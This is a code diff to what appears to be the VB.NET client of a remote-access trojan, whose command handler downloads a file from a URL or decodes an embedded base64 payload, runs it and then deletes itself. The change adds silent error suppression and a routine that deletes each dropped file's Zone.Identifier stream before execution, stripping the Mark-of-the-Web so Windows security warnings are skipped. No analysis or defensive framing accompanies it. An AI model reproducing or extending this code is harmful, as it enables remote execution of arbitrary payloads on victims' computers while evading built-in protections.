@@ -7,7 +7,7 @@
     Public Shared HWID As String
 
     Public Shared Sub CL(DRP As Boolean, EX As String, FP As String, PRI As Boolean, HW As String, CMD As String)
-
+        On Error Resume Next
         DROP = DRP
         EXE = EX
         FullPath = FP
@@ -36,6 +36,7 @@
                     Case "4" 'update disk
                         Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(A(2))
                         IO.File.WriteAllBytes(NewFile, GZip(Convert.FromBase64String(A(3))))
+                        DeleteZoneIdentifier(NewFile)
                         Threading.Thread.CurrentThread.Sleep(1000)
                         Diagnostics.Process.Start(NewFile)
                         DEL()
@@ -44,6 +45,7 @@
                         Dim NewFile = IO.Path.GetTempFileName + A(3)
                         Dim WC As New Net.WebClient
                         WC.DownloadFile(A(2), NewFile)
+                        DeleteZoneIdentifier(NewFile)
                         Threading.Thread.CurrentThread.Sleep(1000)
                         Diagnostics.Process.Start(NewFile)
                         DEL()
@@ -120,5 +122,13 @@
         Catch ex As Exception
         End Try
     End Function
+
+    <Runtime.InteropServices.DllImport("kernel32.dll", CharSet:=Runtime.InteropServices.CharSet.Auto, BestFitMapping:=False, ThrowOnUnmappableChar:=True, SetLastError:=True)>
+    Public Shared Function DeleteFile(<Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.LPTStr)> ByVal filepath As String
+    ) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
+    End Function
+    Public Shared Sub DeleteZoneIdentifier(ByVal filePath As String)
+        Try : DeleteFile(filePath + ":Zone.Identifier") : Catch : End Try
+    End Sub
 
 End Class
